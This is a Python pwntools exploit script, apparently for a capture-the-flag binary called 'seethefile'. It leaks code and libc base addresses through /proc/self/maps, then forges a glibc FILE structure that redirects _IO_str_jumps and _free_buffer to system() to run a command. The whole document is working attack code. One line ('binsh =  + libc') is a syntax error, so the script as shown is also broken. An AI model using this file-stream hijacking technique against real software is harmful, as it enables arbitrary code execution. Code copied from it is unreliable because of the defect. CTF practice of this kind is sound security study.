#!/usr/bin/python3
from pwn import *
context.arch = 'amd64'

r = process('./S', env={"LD_PRELOAD": "./libc-2.27.so"})
#r = process('./seethefile')
l = ELF('./libc-2.27.so')

def ofile(name):
    r.recvuntil('choice :')
    r.sendline('1')
    r.recvuntil('Filename:')
    r.sendline(name)

def rfile():
    r.recvuntil('choice :')
    r.sendline('2')

def wfile():
    r.recvuntil('choice :')
    r.sendline('3')
    r.recvuntil('Data:')

def ex(s):
    r.recvuntil('choice :')
    r.sendline('4')
    r.recvuntil('name :')
    r.sendline(s)

ofile('/proc/self/maps')
rfile()
wfile()
code = int( r.recvuntil('-', drop=True), 16 )
log.info(f'code: {hex(code)}')

for _ in range(2):
    rfile()
    wfile()

libc = int( r.recvuntil('-7f', drop=True)[-12:], 16 )
log.info(f'libc: {hex(libc)}')
d_addr = code + 0x4060
lock_addr = d_addr + 0x500
vtable = d_addr + 0x108
binsh = libc + 0x1b75aa
IO_str_jumps = libc + 0x1ed560
_system = libc + 0x55410

binsh =  + libc
IO_str_jumps = 0x3e8360  + libc
_system = l.sym['system'] + libc
# target: (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base)
# 0xe8 offset for ((_IO_strfile *) fp)->_s._free_buffer
## check: if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
### padding: _flags ~ __IO_read_base == 0x4*7
### _IO_USER_BUF is 1, so lowest bit needs to be 0
payload = p64(0)*4 + p64(d_addr + 0x100) + p64(d_addr + 0x120) + p64(d_addr + 0x120)
### write _IO_buf_base and _IO_buf_end with binsh
payload += p64(d_addr + 0x108) * 2
### write lock (*address == 0)
payload = payload.ljust(0x88, b'\x00') + p64(lock_addr)
### overwrite _IO_file_jumps to _IO_str_jumps
payload = payload.ljust(0xd8, b'\x00') + p64(IO_str_jumps)
### write ((_IO_strfile *) fp)->_s._free_buffer to system
payload = payload.ljust(0xe8, b'\x00') + p64(_system)
payload = payload.ljust(0x100, b'\x00') + p64(d_addr)
payload += b'/bin/ls\x00'
input()
ex(payload)

r.interactive()
